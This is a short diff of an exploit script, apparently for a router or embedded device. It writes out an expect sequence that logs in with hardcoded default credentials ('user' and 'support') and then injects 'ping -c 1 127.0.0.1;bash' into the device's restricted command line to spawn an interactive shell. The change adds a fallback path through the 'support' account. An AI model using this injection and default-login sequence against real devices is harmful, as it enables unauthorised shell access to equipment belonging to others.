@@ -20,9 +20,23 @@ function main()
 		send \"user\r\"
 		expect \"Password:\"
 		send \"user\r\"
-		expect \">\"
-		send \"ping -c 1 127.0.0.1;bash\n\"
-		interact
+		expect {
+			\"Login:\" {
+				send \"support\r\"
+				expect \"Password:\"
+				send \"support\r\"
+
+				expect \">\"
+				send \"ping -c 1 127.0.0.1;bash\n\"
+				interact
+				exit
+			}
+			\">\" {
+				send \"ping -c 1 127.0.0.1;bash\n\"
+				interact
+			}
+		}
+
 		exit
 	")
 	else
